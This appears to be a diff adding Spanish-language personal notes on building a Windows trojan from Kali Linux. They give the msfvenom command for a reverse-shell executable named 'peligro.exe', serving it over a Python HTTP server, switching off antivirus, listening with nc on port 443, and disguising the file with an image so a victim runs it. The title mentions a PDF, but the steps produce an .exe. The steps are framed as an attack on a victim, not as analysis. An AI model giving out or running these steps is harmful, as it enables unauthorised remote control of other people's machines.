@@ -1,0 +1,33 @@
+crear documento PDF que contenga una backdoor que nos de aceso remoto
+desde una maquina kali linux a una maquina windows.
+
+link : https://www.youtube.com/watch?v=HhE66_ibnL8
+
+debemos saber nuestra ip:
+ifconfig
+
+creamos el archivo y lo guardamos en el escritorio:
+
+──(root㉿kali)-[/home/kali/Desktop]
+└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f exe -o peligro.exe
+
+ahora lo compartimos por un servidor python:
+──(root㉿kali)-[/home/kali/Desktop]
+└─# python -m http.server 80
+
+debemos desactivar el antivirus. 
+
+abrimos la ip en el navegador:
+192.168.1.10
+
+y descargamos el archivo
+
+nos ponemos en escucha:
+──(root㉿kali)-[/home/kali/Desktop]
+└─# nc -nlvp 443    
+
+descargamos una imagen para camuflar el archivo
+es importante q no tenga fondo.
+
+
+en cuanto la victima ejecute este troyano vamos a tener acceso remoto a la maquina victima
